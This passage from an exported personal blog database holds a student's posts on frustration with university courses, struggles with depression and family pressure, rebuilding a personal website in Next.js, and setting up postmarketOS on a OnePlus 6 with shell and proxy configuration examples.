disregarded me, clearly ignoring the basic functionalities and utilities of the project. When I asked about concerns about the system's robustness and security, like CSRF, captchas, and access control, the TA completely disregarded and showed no interest. It is greatly irritating when all TAs can't explain something clearly in a project the teacher assigned. \n\nIn another course, TAs clearly show a lack of understanding of my working environments(not knowing about command lines and disregarding Linux).\n\nNot one course was even engaging, and I got so tired. Ahh, imagine.\n\nOverall I felt like there wasn't much I could learn from the school's courses that is relevant, and learning feels a complete waste of time. TA's lack of inclusion makes me feel isolated and rebellious, adding to my resistance to learning.\n\n### Too Many Courses\n\nI selected 10 courses, way too much for me because I was pushed by the school's credit system.\n\n### Learning Nothing from School Previously \n\nI learned pretty much nothing about Computer Science or anything useful in USTC, previously while dedicating significant time and effort to school. And I wouldn't learn much with the very outdated knowledge, so I didn't study in school. \n\n## What to do Next?\n\nObviously, this attitude towards school was very problematic, and disregarding academics in the end only caused harm to ourselves. \n\n1. Choose fewer courses\n\nSelect a few courses that we can manage even if we hate all of them\n\n2. Make solid plans to self-pace learning the courses\n\nSo like basically I still need to understand the courses as they are fundamentals(even though the school's teaching is just pure SHIT)\n\n3. Have fewer distractions\n\nAnyways, keep on boycotting video games.\n\n## Some Hopeful Remarks\n\nThe worst time had gone, and the goddamn semester had ended, from now on everything will get better.", "date": {"$date": "2024-07-09T03:09:34.896Z"}, "__v": 0}, {"_id": {"$oid": "66ebe945f24e7c3e85e8de9d"}, "title": "State", "date": {"$date": "2024-06-26T00:00:00Z"}, "type": "private", "body": "## Guideline\n\n- Monthly: Update Finance Accounting\n- 2025.02: Update Cloud Infrastucture, Source Code, Fix Github Issues, Update State\n- Computer Science\n- Minimalism & \u274c **AVOID Social Media & Gaming**\n- Resilience\n\n## [Finance Accounting](https://github.com/jimchen2/finance-management)\n\n## [Configuration Files](https://github.com/jimchen2/config-dump)\n\n## [Cloud Infrastructure](https://github.com/jimchen2/cloud-setup)\n\n\n## Main Apps\n\n- [Markdown Parser](https://markdown.jimchen.me), [My Source Code](https://github.com/jimchen2/markdown-parser)\n- [GitHub](https://github.com)\n- [Alist S3](https://bucket.jimchen.me)\n- [LLM](https://llm.jimchen.me), [My Source Code](https://github.com/jimchen2/vercel-bedrock)\n\n## Other Self-Hosted Apps\n\n- [Miniflux](https://feed.jimchen.me)\n- [Nezha](https://nezha.jimchen.me/)\n- [Grafana](https://grafana.jimchen.me/)\n- [NextChat](https://chat.jimchen.me/)\n- [Gitea](https://git.jimchen.me/)\n- [LinkTree](https://link.jimchen.me), [My Source Code](https://github.com/jimchen2/linktree)\n- [Blog](https://jimchen.me), [My Source Code](https://github.com/jimchen2/My-Website-New)\n- [Portainer](https://portainer.jimchen.me/)\n- [Matrix-Dendrite](https://matrix.jimchen.me)\n- [Peertube](https://peertube.jimchen.me)\n- [Mastodon](https://mastodon.jimchen.me)\n\n## External Websites\n\n- [Chinese Tech Discourse](https://linux.do/)\n- [1tv Skate](https://1tv.ru/skate)\n- [Free Media](https://fmhy.net//)\n- [Lemmy](https://lemmy.ml/)\n- [YandexGPT](https://a.ya.ru)\n- [Lmsys](https://chat.lmsys.org)\n- [ChatGPT](https://chatgpt.com/)\n- [Poe](https://poe.com/)\n- [Gemini](https://gemini.google.com/)\n- [Perplexity](https://www.perplexity.ai/)\n", "access": 3}, {"_id": {"$oid": "66ebe945f24e7c3e85e8de9e"}, "title": "Addressing the Problems Lately", "date": {"$date": "2024-06-21T04:34:00Z"}, "type": "journal", "access": 1, "body": "I am dealing with depression. I am not kidding. I had this anxiety and stress for at least 4 years, and it's getting worse and worse.\n\n## Disclaimer\n\nObviously, I am not in a situation as serious as a minor being abused, people facing domestic violence, workers being exploited, working in hard-labour low-paying jobs for long hours. But anyway it is still a valid personal experiences, and since this is my personal blog I am documenting it here.\n\n## Work-Life Balance\n\nI always expressed concerns about work-life balances, and they were always dismissed for reasons like\n\n- Me \"faking\" hatred for school only to be \"superior\"\n- Not willing to unleash full potential, \"lazy\" and get out of comfort zone\n- Fake assurances, always like \"Just one more week, You get over this, and everything will be fine\"\n- Downplaying my struggles for \"cultural norms\"\n\nHowever, these claims are total invalid and wrong, and a great misunderstanding, I want to clarify.\n\n1. The hating for school have nothing to do with me being superior. People have different learning capacities, and need moderate hours, it isn't targeted to school. I am also not intentionally being superior or whatsoever when I feel burned out by overworking.\n2. Everyone has their limits, and I am alreay trying my best and overworking, while it might be perceived as \"not working as much I should\", actually I am really trying but sometimes people just get tired\n3. Things were never fine. I had thoughts like this over the past 4 or 5 years, and that thought kept me going for some time, however, things only got worse and worse. I am truly worn out now.\n4. While it is true for cultural norms to neglect these concerns, especially in China where every student overwork, I don't find my situation meaningless or not valid, in fact, while Chinese students can certainly handle large amounts of pressure and demand academically, it usually comes at a cost for enthusiasim, lack of creativity and self motivation, which I think are more crucial than studying itself. The whole social trend is hugely problematic and I am not going into that any more, and the fact something is a norm in a culture doesn't justify it.\n\nPeople frequently undermine my claims, when I say \"I am not ok\", nobody cares. People pay no attention to me when I articulate my thoughts, frequently misunderstanding and judging me in their biased views.\n\n## Parents' Attitudes\n\nMy parents say to me almost on all our coversations (and this is so annoying), \"You are better off here than in high school, you were fine in high school, you are fine now.\" I wasn't fine in high school, nor was I fine in freshman year. In fact, I had significant challenges that they overlooked and didn't pay attention too. The fact high school was worse off than the situation I am in right now doesn't mean the situation I am in now is fine.\n\nThey also downplay my social abilities and misjudge my social status. While it is true I am socially isolated, I did this because of the intense pressure of academics, which I cannot cope with continously. Socially I am actually a fine person. Never once did I find a situation where I could find a study life balance, and all my energies were constrained by school. I struggled so hard. I am an introvert and when I struggle I tend to go more isolated, and it's not like I am nonsocial or lacks the skill the deal with people\u2012it's just an effect of being overwhelmed. Introvert can be perfectly good at socializing, it's just they are defined to cope with struggles by spending time alone. I showed remarkable social skills, being able to connect with lots of people repeatedly, but when I face huge imbalances in life I can't help but seem isolated.\n\nMy parents were not empathizing with my situation, they are downplaying it and mocking me, not realizing the root causes and keep putting even greater pressure, driving me into those hugely competitive environments in hope for better results, regarding me as a machine rather than a human being in need for balance and mental care.\n\nMy parents did not pay much care, or they are simply confined in their own circumstances, to adequate understand and compassionate with me. My parents regarding my freshman year, a very very challenging year, as \"perfectly fine\" was really demeaning to me. I wasn't fine that year and that year directly caused my current depression.\n\n## Start of This Semester \u2012 Recap\n\nThe start of this semester is inarguably the worst start I ever had. I stayed at home for a whole week without any motivation to go out and meet any people at all. I didn't want to do anything, didn't want to work. It was a seroius problem.\n\nSort of like when you are on a long journey, obviously you are taking regular breaks on the road. I thought it was a regular break back then, like sit for a while then get going again. Except when I tried to get back on track, I couldn't. The following three months, March, April, May, I tried really hard to get myself back to working in school, but my efforts always lead to failure and continued disengagement. I should have known things were terribly wrong at the start of the semester, I did wrote about it, but people don't care and I ended up selecting 10 courses anyways, just trying to get things done.\n\nI didn't thought about the consequence and my well being because they were always neglected and disregarded. With the increasing bias and polarizing opinions, and me not achieving any success at all in school. It became a norm and de facto for overworking in China, and thus, I didn't realize that I was going to break from overworking one day until it happened, which is now. My parents disregarded my wellbeing and the school disregarded my wellbeing. Essentially with huge expectations and a lack of motivation, I fell apart.\n\nRecapping those years before not one year is fine, nor did I find any balance in studying.\n\n## Emotional Breakdown\n\nI have frequent emotional problems usually causing me sleepless nights and making me sad for days. I feel guilty for not \"performing well\". I feel imposter syndrome.\n\nThese days, or pretty much all this semester, I slept at daytime and spend half, or all nights up, not being able to fall asleep. I cannot get engaged anymore with school, it became very uninteresting.\n\n## Never Ending Situation\n\nIn middle school, people say \"just a few more months left of hard work studying and you become happy in high school\". I believed in them and worked hard, hoping for a better high school experience, a more balanced and happier teenage years. Instead, it was a total opposite. The high school I attended was like a prison with dictators and censorship, forcing students to stop using phones and computers, demanding and rigorous schoolwork of over 15 hours a day, frequent gaslighting and brainswashing propagandas \"you get better person by studying hard\", promoting sacrificing sleep, eating times for studying and overly promoting academic role models. My parents were also in line with the school policy, coercing me to \"Try hard\", and regarding my appeal for a balanced teen life with \"ridiculous and lack of obvious effort\". Since I was young, there was no option but to listen, and they remained terrible memories. After working immensely hard, however, I didn't get better in academics because it was a rat race between classmates, and I could never get an ideal score. My parents regarded me as \"stupid\" and \"problematic behavior\". In university, when I said my dormmate's overly problematic behavior was too overwhelming for me and it was no longer bearable to live in the dorm, my parents also claimed it as \"nonsense\" and \"lack of endurance\". When I later finally moved out, they threatened me with \"it's parents moeny I am using\", and \"behave or go back in dorm\". The school empasizes raw exam scores, paying little regards to student's mental health, almost taking it as a pride. The university don't care if you learn or not, as long as you seem to be \"competing\" against each other harshly. The university doesn't care if you are learning up to date technologies or if they even sound logical, it just cares if you are \"putting many hours a day\" and \"compliant\".\n\n## My Own Interest/Hobbies\n\nOver the years my own interests were largely looked down upon and being neglected, with studying being the primary focus. I frequently find I was only spending one or two days and even forgetting about them at all. This becomes more and more frustrating as times passes because I was promised things would get better, and I would either excel at academic performances given hard work or \"although my life is challenging now, a balanced life is coming soon\". However, in no situations did my life actually become more balanced, and seeing all those interests die makes me miserable.\n\nNowadays I feel a sense of guilt in pursuing my interest, because they seem not to be aligned with studying in school. My parents were like \"you can have your hobbies\", with no regards whatsoever about whether that's feasible in the environment or not. When in such a challenging and struggling environment, there is simply no place left for hobbies.\n\n## No Ideal Performances\n\nWith such great emphasize on academics, you would expect me to have outstanding performances and excel. However, that doesn't happen, as I got lower and lower grades, having frequently struggling all the time. My results were not ideal and they are greatly unsatisfying, and at the same time my hobbies are neglected, leading to no sense and meanings of life. I got depressed and finally can no longer handle it recently.\n\nAs a way to get back some meaning or happiness I tried to seek out entertainments or interests, and it's almost instincts that makes me not wanting to work at all with school.\n\n## \"If I knew it all then, Would I do it again?\"\n\nIf I knew I wasn't getting out of the situation whatsoever, I would simply refuse to overwork from 4 years ago, I might refuse or even argue with the teacher for my wellbeing. In fact, I was too young to be able to do that, so I ended up in this worse situation.\n\n## What can I do now?\n\nThere is literally nothing I can do to get myself back on track with the consistent stress accumlated over the latest years. All I can do is not to make myself more gloomy.\n\n## What Would I do in the Future?\n\nI had made up my mind to maintain a work life balance in the future, and I am determined to prioritize my happiness and wellbeing. I am not going to believe or be brainwashed by the social trends or fake claims to overwork myself. I want a laid back and chill lifestyle.\n\n## Block Things\n\nAlso I am going to block things, in particular\n\n1. Things that promotes overworking\n2. Things that makes me uncomfortable, or tries to disencourage me from interests\n3. Things that are too distractive, like Social Media\n4. Pervious Students who have very conflicting views with me\n\n## Develop a NextJS Video Platform\n\nIn fact, I am developing my own video platform with NextJS. The design is like this\n\n1. I am going to hoard a large amount of data legally from sites that allow redistributing like \"archive.org\"\n2. I am going to avoid downloading or linking paid videos at all\n3. I am going to include an iframe for YouTube or similar platform's videos in my personal website\n\nThis can allow me to not go on YouTube that frequently, basically like going on YouTube for once a month or so and index the videos and copy the html embedded code for the videos I am most interested in to my platform, then I am going to include that in search results. It is nothing illegal as embedding YouTube videos without downloading them is a common practice.\n\nMy previous video platform was built with Bootstrap, which is functional but far from ideal, I realized after abandoing that platform that I still need a personal video platform and existing ones are far from ideal for me personally, e.g. MediaCMS or NextCloud or LibreTube. They are awesome projects, just not tailored to my needs.\n\nIf I build my own Website I can stop using the comments or stop seeing the recommendations, which would be better and more focused.\n\n## Keep Up With Tech, but No Need with News\n\nIt is important to keep up with the most modern technologies, but for news and politics they are addictive and useless. They cause distractions and stop me from doing the thing I need to do. Anyways, the latests fashion trends are largely irrelevant to my life. So as a result I would try to stop myself from being addicted to social media and try to get my life in a better place.\n\nI would shut off every nonsense and pursue a better, distraction-free lifestyle. I already quit twitter and instagram which made me far more happier.\n\n## Utilzing APIs more\n\nI would also be utilizing APIs to build customized interface with nonimportant social media more. \n\n## Emphasizing More on Interests\n\nI need to focus more on my personal interest, they are the last thing to cling on for happiness. I would need to place them seriously.\n\nI will be regularly studying languages, at no costs. I would try my best to keep my interest alive.\n\nI would go on streets and do my interest and go on subways and do my interest basically engage my free time with my interests.\n\n## Focusing on AI\n\nI would Focus on Machine Learning because that is the thing to do right now. I should spend far more time into this because it is more cool and interesting and more valuable than stupid school.\n\n## Treating Social Media\n\nSocial Media are not \"cancer\" or \"disease\" or \"very harmful\", no. \n\nBut I still refrain from engaging in them, I don't hate them and don't like them, simple.\n\nFor essential services like YouTube I would have to possibly index its data to my website though.\n\n## Data Hoarding\n\nI am going to hoard more data to my cloud for personal use and entertainment. I am going to avoid controversies and troubles when hoarding data, notably avoiding platforms like 123movies or Bflix or whatever illegal streaming platforms.\n\nI am going to utilize the latest web dev technologies with probably NextJS as the tool to hoard down the essential data I need for consuming. \n\nI won't rely on social media or going regularly on those websites because it is not a good idea. In fact, I would probably hoard all the data infrequently to my websites in a legal way and hoard many other data from legal sources to entertain myself more in a distraction-free, modern fashion."}, {"_id": {"$oid": "66ebe945f24e7c3e85e8de9f"}, "title": "Redesigning Website with Nextjs", "date": {"$date": "2024-05-30T04:24:00Z"}, "type": "web-dev", "access": 1, "body": "## What Happened?\n\nSo my old website is retired now. I used React Bootstrap to code it.\n\n## Why?\n\nBecause I don't like Bootstrap anymore. Bootstrap was the first thing I jumped into when I studied web dev, and it was the only framework I knew. I designed 4 websites with it, my own website, my video tube, a site generated after web scraping, and a shitty homework assignment.\n\nAfter the first time like React Bootstrap was like the de facto for me in web developing, and like there are a whole bunch lot of stuff out there, like Vue, Angular, Svelte, etc. But like with limited time I quickly settled on my first framework.\n\nSo like my old personal website was once very neat and small, then it gradually got bloated and filled with all sorts of stuff. I kept adding things to it and made hundreds of commits.\n\nSo like the first version was back in June 2023, and I just used it to display my blogs and let people leave a message, nothing serious. What motivated me was like I couldn't get satisfied with one of those github pages, like I changed something to what I wanted and it would error and I would literally sit there for hours not knowing what to do.\n\nSo anyways, long story short, I started learning and after 3 weeks my website was born. It just displayed my blogs and visitinfos and a message box.\n\n## Complexity vs Simplicity\n\nOver time there was more and more functions on my website,\n\n1.  In version 1 I added Comment and Likes to my Blogs, so anyone can like any blog and could comment on any blogs. That was the end of summer in 2023.\n    ![alt text](https://cdn.jimchen.me/Screenshot%20from%202024-05-30%2023-05-11.png)\n\n    That was also the time I decided to stop using GUIs in servers. Previously I was overwhelmed by the complexity of systemd(what a joke). I also didn't understand npm really well. So I was like, I couldn't do anything without a GUI, and I felt lost and hopeless working in the Linode shell.(ridiculous as hell right?)\n\n    Anyways, I followed the guide step by step and installed vnc and ubuntu-desktop,(guys, Ubuntu-desktop, not even vanilla gnome, literally, on a server, the bloated crap), and connected to it with vnc.\n\n    Well, you know what, I hate vnc so much now,  it is just buggy and unnecessary. Why sacrifice the simplicity of a command line for something much more complicated?\n\n2.  In version 1 2 added Blog Types and Blog sidebars. So people can go to my preview page. That was in October 2023, and I  \n    ![alt text](https://cdn.jimchen.me/Screenshot%20from%202024-05-30%2023-03-58.png)\n\n3.  In version 3 I rewrite the whole code again. Literally at this point there was all those `style={{}}` in my code just everywhere and I used vanilla CSS without utilizing te React Bootstrap components(which is so stupid). I also implemented a search function and added latex support(just using MathJax), and different color themes. That was in November 2023.\n\n4.  In version 4 there wasn't much changes. I just added personal logs(I wanted to do some note-taking or stuff, kinda like Joplin or Notion), and I fixed bugs in themes in the prev version.\n\n    However, though, the log turned out the be a total failure, and I ended up not using it after all. I knew better now than to use something I wrote myself in daily life, it was just unstable and lacks lots of features.\n\n5.  In version 5 the focus was on the server side. I deleted lots of stuff like logs and messages(nobody leaves a message for months). I added a selfhosted PhotoPrism link, a self-hosted Uptime-Kuma for monitoring.\n\n    I realized I was (all the time) constantly ran `sudo npm start` for my website, which is quite stupid. I shall do `npm run build` for production builds and for nginx LMAO.\n\n    I wrote a setup script and streamlined the deployment. I used nginx and letsencrypt for https, and dumped the monogdb(so I can restore it), added systemd services to setup and update.\n\n## What I didn't like about the Website\n\nThere are several things, including, the like function.\n\nWell first of all I wanted initially to design a like function for blogs and comments(turns out nobody visits my damn website so it was useless junk after all). And you know I must implement some way to prevent somebody from liking it twice. Well what first came in mind was obviously some log in measures(that was too hard to implement), so I settled on logging the ip address.\n\nThis is a bad idea as it depends on some third party(ipapi.co/json to be specific), and also making a request takes some time(although unnoticeable). There wasn't any traffic, like, ever, to my website, and I got fewer than 10 likes(even from myself) in the whole lifespan of the website so like it was really really useless.\n\nBasically implementing a like function is useless and bloating things up. And the sad thing was I implemented it on the initial version, and it is kind of complicated as literally everythign depends on the ip as the identity.\n\nAnother thing that bloated up was the theme. So initally I implemented the theme by writing some theme colors for everything, so like\n\n```js\nupdateColor(\"color_white\", \"#1a1a1a\");\nupdateColor(\"color_black\", \"#ffffff\");\nupdateColor(\"color_blue_1\", \"#6aff6a\");\nupdateColor(\"color_blue_2\", \"#00ff00\");\n```\n\nusing this to wrap everything around instead of utilizing dark reader library, which greatly complicates the code.\n\n## How the old website Looked\n\n![image](https://cdn.jimchen.me/Screenshot%20from%202024-05-30%2023-08-41.png)\n\n![image](https://cdn.jimchen.me/Screenshot%20from%202024-05-30%2023-09-27.png)\n\n## Why is wrong with React Bootstrap?\n\nNothing, just Bootstrap is quite old, and it made these WEIRD LITTLE BOXES. Literally they are so freaking ugly.\n\nIt's not like companies don't use bootstrap, because I realize some companies using Bootstrap very quickly when they have these weird little boxes too, like some illegal phone selling companies. And sure it is bootstrap in the browser debug console.\n\nLiterally the worst thing is those weird little boxes, and they make the website looks not nice. Anyways, React Bootstrap is OK, not bad.\n\n## Why do I want to change?\n\nGenerally because my website is getting too bloated for things I don't want to be there, and it turned out even less popular than I expected it to be.\n\nAlso think about it, when you literally don't like a function implemented on the website why do you expect others to like it? It is like those Ch!nese Companies that implement the trash softwares and expect people to use or the retarded computer science teacher that reads off the ppt without knowing what git is. Like literally I think what we should demonstrate to the world should be minimalistic and be to the point instead of bloated and shitty.\n\nLike the stupid visitinfos and status and all those stuff in my old website are pretty useless though. Literally in a time when code is exploding everywhere, it is important to stay simple and stay true.\n\nLike some personal websites which points to large amounts of garbage picked from somewhere claiming its \"interesting\". Well, if you are not interested and organizing your stuff I am not gonna get interested anyway.\n\nThere is nobody visiting my website and I don't expect anybody to in the future but my point is that I just don't need that much features.\n\n## Why do I want to use NextJS?\n\nNextjs really have some good practices, it preconfigures lots of things.\n\n1. It streamlines the frontend and backend together, so no need for proxying some weird ports to `/api` in nginx and no need for 2 services to start simultaneouslya nd no need for cors.\n2. It uses those api routes predefined ot be the name of the file so you don't have to like include a file every time you add a file or route(really frustrating though).\n3. The frontend is also very convenient as it simplifies things to `pages.tsx`\n4. Using tailwind css is really convenient! It simplifies frontend coding so much and you don't have to learn `css`, instead just defining html class is enough!\n5. Big companies are using it! Like, literally, it is really popular.\n\nPeople say you can even write sql queries in the frontend(although I would never try that).\n\nAs somebody put it, \"Nextjs is putting a lot of best practices together simplified to make a modern sleek website\".\n\n## What do I have in my website now?\n\nAfter a long heated debate with myself simplicity wins. Simplicity always win when I battled myself.\n\nSo right now I have an about page with resume and my blog and some links and nothing else. I have like 3 things in my website.(The links are in the footer so that counts as 2).\n\n## Changing the Annoying Boxes displaying Blogs\n\nSo like displaying blogs vertically on a whole page is just ugly. I mean it. So I chose to display them inside a box on the left hand side of the website.\n\n## About Frontend\n\nAs much as I was into frontend design, doing a frontend job was just not my thing. It is different between a hobby vs your work. Well, I am not saying absolutely not, because if someday I am starving and there was a good frontend job with decent pay I would undoubtedly go and do it.\n\nFrontend is one of those areas in computer science that lacks depth and one can easily do it. It's like quite useless for someone delving deep into research(though there might be some research in frontend). It is useful to understand how it works, to look into the debug console and write a few scrapers, to change the cookie and see what happens, to write a react website whatever. However, it is pretty useless for me now after I got used to it.\n\nWhat's ironic is about how much people around me like understand frontend. When I was in Berkeley I felt like literally everybody learned frontend(there was like at least 3-4 decals with 200 people each and at least 10 clubs teaching frontend). But here I am in USTC when I was like saying React people say they never heard about it. VB is still popular(LMAO my programming nightmare literally), and knowledge is just, outdated here.\n\nAnd in the crappiest database course ever the outdated teacher force you to write a frontend (????), instead of designing a database. he was like \"frontend was everything\", and \"really impressed people can do Kotlin or IOS developement\", LMAO what a stupid course, like he was assuming students don't have brains, and it was one of the best courses this semester that at least got a decent website with https and decent TAs. The teacher also really liked closed source database, like \"Oracle\" or \"Micro$oft\" and didn't even talk about interesting ones like Postgres or MongoDB. I lost motivation to study and got addicted to servers and frontends and cloud more than I was addicted to gaming before and stayed up endless nights hooking up with them these days and there was just no way to get back to this shitpile."}, {"_id": {"$oid": "66ebe945f24e7c3e85e8dea0"}, "title": "MacBook Air Config", "date": {"$date": "2024-04-30T10:36:00Z"}, "type": "linux", "access": 1, "body": "## Why MacBook?

Mainly because I am using WeChat too frequently, and it is kinda addictive and time-wasting. Those apps eat away at me and gradually I become dependent on the mobile phone, glued to it occasionally. Eventually, I decided that carrying WeChat with me everywhere is just too distracting.\n\nFurthermore, LineageOS doesn't offer as much control as Linux does. I mean, it does offer more control than iPhone or many Android phones with those crappy UIs, but it is more or less based on Android, and I am not that familiar with it.\n\nWith digital freedom and being liberal in mind, I began to explore PostMarketOS.\n\n## Jailbreaking iPhone Crash\n\nI tried to jailbreak the iPhone after running a script, but unfortunately, after that, my iPhone no longer boots, so I don't know what to do with it other than letting it rot.\n\n## Buying OnePlus 6\n\nAmong the many devices supported by PostMarketOS, OnePlus 6 is a very accessible and modern choice, released in 2018. I hadn't realized that it was 6 years old though. Other devices like Nokia N900 have only 256 MB RAM, and the Samsung Phones were released in like 2013 or 2014. Anyways, I bought OnePlus 6 for 490 RMB (70 USD) from an online retailer store and began exploring.\n\n## Flashing the ROM\n\nEverything is very easy and straightforward; unlock the bootloader, then flash 2 images, and I am done.\n\n## Desktop Environment\n\nThere are Phosh, Plasma Mobile, Gnome Mobile, and SXMO.\n\nSXMO doesn't really have a UI; it's more like i3, managing everything from a dropdown menu.\n\nPhosh and Gnome Mobile are pretty alike. Phosh was the mobile version for GNOME, but there are some small differences. They come with the same software shipped.\n\nThe wiki (https://wiki.postmarketos.org/) has most things anyway.\n\n## About Gnome Problems\n\nOverflow: It is kind of working in GNOME with all windows very small.\n\n- Overflowing:\n\n  - Nautilus is overflowing\n  - Chromium is overflowing\n  - Firefox Works, but some website overflows due to useragent being a computer(still overflows when I set useragent to mobile), My 2 websites, `jimchen.me` and `anonytube.jimchen.me` works well though, since I am determining the fonts based on the window innerWidth.\n\n- Doesn't natively support Chinese characters.(Plasma Mobile does, but its even more breakable)\n- Needs manually switch between Headphones and Speakers: Kinda harder\n- Rebooting error due to hardware problems, sometimes running into Snapdragon Coredump\n- Screen not auto-closing\n- Doesn't support many appimages(have to configure Clash manually)\n- Need to re-login on every screen close, and it was configured to accept 6 numbers (sometimes buggy if the password contains other things), thus the user password needs to be 6 numbers, else it got very buggy on login\n- Camera not working on OnePlus 6 and OnePlus 6T\n- Cannot tweak. I tried tweaking the font and it broke the user interface. It is easily breakable, if I tweak the phone becomes unusable\n- Cannot receive calls (can initiate calls and receive messages)\n\nThese are mostly kinda small problems and can be solved by scripts, except the last problem receiving calls, which makes it not usable than a daily driver. Even a senior citizen easy phone can do calling with no problems.\n\nThe driver isn't waking up in PostMarketOS, and in the community version Droidian they ship some android drivers to make it work.\n\n## About SXMO\n\nSXMO is like swm for phones. It is so snappy and build all with scripts(there are those hooks for calling, for receiving messages, etc). It is really really cool and builds upon a text based menu, and everything is customizable(instead it is more like someone's customized scripts rather than a well-established DE) I can run qutebrowser on it, and it features a really cool keyboard where you control everything on the screen(like etc, and those vim bindings). It even use vim to send messages as default! I was like, wow.\n\nLike when I tried to navigate around the menu I can easily know the cli commands to get those stuff, like connecting to wifi or whatever. It is literally navigating through the terminal with a cli interface.\n\n## Customization\n\n### SSH\n\nRun `sudo rc-service sshd start` for computer to sshd into it.\nFrom usb: `ssh user@172.16.42.1`, else run ifconfig and get the ip address.\n\n### Installing Stuff\n\nUsing gnome-mobile, there are many preinstalled apps that are unnecessary, and I also need some stuff, after connecting to wifi, I run these commands to customize it a little bit\n\n```bash\ncd ~ && rm -rf Desktop Downloads Pictures Templates Documents Music Public Videos\nsudo rc-update add sshd default\nsudo sed -i 's/dl-cdn.alpinelinux.org/mirrors.ustc.edu.cn/g' /etc/apk/repositories\nsudo apk del firefox-esr lollypop loupe gnome-clocks postmarketos-tweaks  gnome-contacts karlender portfolio gnome-software gnome-calculator postmarketos-welcome gnome-text-editor && sudo apk update && sudo apk upgrade &&  sudo apk add bash curl nano vim firefox git net-tools ranger\n```\n\n## Full Disk Space\n\nAs we all know, Alpine Linux is lightweight, and added together it was around 2.3 GB\n\n```output\nFilesystem                Size      Used Available Use% Mounted on\ndev                      10.0M         0     10.0M   0% /dev\nrun                       3.7G      2.2M      3.7G   0% /run\n/dev/mapper/userdata2\n                        108.7G      2.3G    100.9G   2% /\n/dev/mapper/userdata1\n                        221.1M     60.2M    149.1M  29% /boot\nshm                       3.7G         0      3.7G   0% /dev/shm\ntmpfs                   756.0M     20.0K    756.0M   0% /run/user/10000\n```\n\n## Configuring Clash\n\nSo before that I used Clash-verge in Linux(a frontend gui for clash that works fine). There is also Clash for Android. But like the gui isn't working well in PostmarketOS, so as an example to program it from command line, add a `test.yml`\n\n```yml\nproxies:\n  - name: \"Server1\"\n    type: ss\n    server: bff6ce3.gxtewt.lol\n    port: \"43748\"\n    cipher: aes-128-gcm\n    password: [YOURPASSWORD]\n  - name: \"Server2\"\n    type: ss\n    server: bff6ce3.gxtewt.lol\n    port: \"43641\"\n    cipher: aes-128-gcm\n    password:  [YOURPASSWORD]\nmode: Global\nexternal-controller: '0.0.0.0:9090'\nport: 7890  # HTTP proxy port\nsocks-port: 7891  # SOCKS5 proxy port\n```\n\nThen get the file `Country.mmdb` and put it in current dir.\n\n```bash\n$ clash -d . -f test.yml\nINFO[0000] inbound http://127.0.0.1:7890 create success.\nINFO[0000] inbound socks://127.0.0.1:7891 create success.\nINFO[0000] RESTful API listening at: [::]:9090\n```\n\nUsing the api\n\n```bash\n$ curl http://localhost:9090/proxies/GLOBAL\n{\"alive\":true,\"all\":[\"DIRECT\",\"REJECT\",\"Server1\",\"Server2\"],\"history\":[],\"name\":\"GLOBAL\",\"now\":\"Server2\",\"type\":\"Selector\",\"udp\":false}\n$ curl -X PUT -H \"Content-Type: application/json\" -d '{\"name\": \"Server1\"}' http://localhost:9090/proxies/GLOBAL\n$ curl http://localhost:9090/proxies/GLOBAL\n{\"alive\":true,\"all\":[\"DIRECT\",\"REJECT\",\"Server1\",\"Server2\"],\"history\":[],\"name\":\"GLOBAL\",\"now\":\"Server1\",\"type\":\"Selector\",\"udp\":false}\n```\n\nOnePlus 6 doesn't work with calling functionality. I bought OnePlus 6 fajitta, in hope that it will work with calls. I was still eager not to give up. It said on the Postmarket OS wiki that fajita's calling is working.\n\n## Flashing Mobian\n\nSo I decided to first try mobian.\n\nThe process is very straightforward, just go to fastboot and flash the boot and userdata image to it and that's pretty much it. Mobian was running with Phosh, and it was pretty cool.\n\nHowever, the calling function isn't working, and I cannot receive calls.\n\n## Trying PostMarketOS again\n\nAnyways, I tried PMOS again, but it still doesn't work with receiving calls(like OnePlus 6 and OnePlus 6t are pretty similar, why should I expect OnePlus 6t to work with calling? Lol).\n\n## Device got Bricked\n\nThen I got kind of sad and tried to erase some partitions with fastboot, however, in flashing, I erased a critical partition accidentally with fastboot, and my device got bricked and stuck in a bootloop. \n\nSo I went to get the stock firmware and payload dumper(on github), and extracted the images. Basically run `fastboot getvar all\n`, and see which specs of the phone and which slot is active. So flash to the inactive slot and then switch. I made the mistake of flashing to different slots multiple times.\n\nAnyway, I flashed them to the phone with fastboot, then rebooted, and everything works smoothly, and I was able to recover back to Android. It went to crashdump mode a few times, but overall it's not that hard. I thought I was in great trouble, turned out everything worked fine.\n\nThen I flashed PostMarketOS again and it was fine(without calling).\n\n## Washing the Phone\n\nSo the phone is second-handed and very dirty, and I tried to wash it, but after washing the phone fastboot devices could no longer detect the phone(I don't know if it is relevant, just suspecting). USB ssh still works so it's really weird, like I go to fastboot mode and it wasn't even detecting anything, lol. I don't know any other ways to flash or whatever.\n\nAfter a while(I think like 2 hours or so), I went back and tried fastboot and it worked miraculously.\n\n\n## What's Good about PostMarketOS?\n\nIt gives users full control, including but not limited to (I observed these):\n\n- Browser behaves like a computer, so if you switch tabs, brower videos play in the background. It can be a miniserver, kind of like a Raspberry Pi without those pins and controls\n- Have a native console. Ahh,, the amount of power and control I feel with the cli, like literally the phone is under my control. I can also ssh easily, and problems can be fixed much faster.\n- Package Manager!!! Like honestly, I would die for a package manager (although this means limited software anyways, like only those working in Linux, like no shitty WeChat, lol). There is Fdroid on Android that's mostly FOSS software and it's pretty good too(It includes link to the source code and you can update it easily)\n- Native Linux env: I am most familiar with Linux and not familiar with proprietary environments\n- Good Desktop Environment! Like you can install different DE, so no monopoly is at place. At least Gnome, dwm(sxmo), and Plasma work to some extent on PostMarketOS, so like you can choose which desktop environment you want instead of being stuck with something the company provides. I am not specifically saying the DE the company provides is bad or something, just choices make one happier(given choices I might still choose the default, but I will probably feel more contented).\n- Debloated. Honestly a phone doesn't need or consume that much space as much as 128 GB. My computer doesn't need that much SSD unless running some machine learning models locally. A fresh install is only around 2 GB, and it is with Gnome(which is considered a heavy DE). Honestly among the well supported distros Alpine is the lightest.\n\n## Is PostMarketOS a SmartPhone?\n\nOf course it is, except it is more aligned with the functions of computer than phone. It is kind of like a Rasp Pi but with calling and messaging functions.\n\nAnd also, the OnePlus is a smartphone, so it should be a smartphone. Whether a phone is smart shall be categorized be the kind of phone it is, not by the kind of operating systems.\n\nAlso it can browser web like on computer, so I do think it is a smartphone. It is only uncompatible with apks and App store.\n\n## About People's Opinions\n\nIt's a person's freedom to think I am weird and don't like my ideas, but I think the same too about others though. Mobile Linux has a far smaller market than laptop Linux(although Android in build upon Linux core), so probably very very few people would 